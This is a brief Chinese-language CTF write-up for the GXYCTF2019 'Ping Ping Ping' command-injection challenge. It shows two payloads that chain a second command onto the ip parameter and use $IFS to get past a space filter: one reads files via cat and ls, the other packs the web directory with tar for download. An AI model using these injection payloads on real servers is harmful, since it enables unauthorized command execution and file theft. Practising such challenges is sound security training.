# [GXYCTF2019]Ping Ping Ping

## 知识点

`命令执行`

## 解题

### 方法一 cat及命令执行符号

过滤很严格 最后`payload`

```bash
1;cat$IFS$9`ls`
```

然后查看源代码看到`flag`

### 方法二 当前目录非预期tar

或者使用通杀命令执行的`payload`

```bash
?ip=1;tar$IFS$9-cvf$IFS$9c$IFS$9.
```

即会将当前目录下的文件打包到`c`里，然后直接访问`/c`即可下载，下载后直接解压即可获取`flag`

